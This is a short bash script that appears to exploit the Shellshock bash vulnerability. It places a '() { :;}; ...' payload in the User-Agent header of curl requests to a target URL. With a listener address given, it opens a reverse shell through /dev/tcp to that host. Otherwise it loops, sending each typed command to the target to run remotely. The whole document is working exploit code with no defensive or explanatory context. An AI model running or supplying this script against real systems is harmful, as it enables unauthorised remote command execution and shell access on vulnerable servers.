#!/bin/bash
url=""
lhost=""
lport=4444

while getopts u:h:p: opt; do
  case "$opt" in
    u) url=${OPTARG};;
    h) lhost=${OPTARG};;
    p) lport=${OPTARG};;
  esac
done

if [[ -z "$url" ]]; then
  printf "Usage: bash %s -u <url> -h <lhost> -p <lport>\n" "$0"
  exit 1
fi

if [[ -n "$lhost" ]]; then
  printf "Sending reverse shell to %s %s\n" "$lhost" "$lport"
  curl -A "() { :;}; /bin/bash -i >& /dev/tcp/$lhost/$lport 0>&1" -s --output /dev/null -k "$url"
  exit 1
fi

while true; do
  printf "$ "
  read -r cmd
  curl -A "() { :;}; $cmd" -s --output /dev/null -k "$url"
done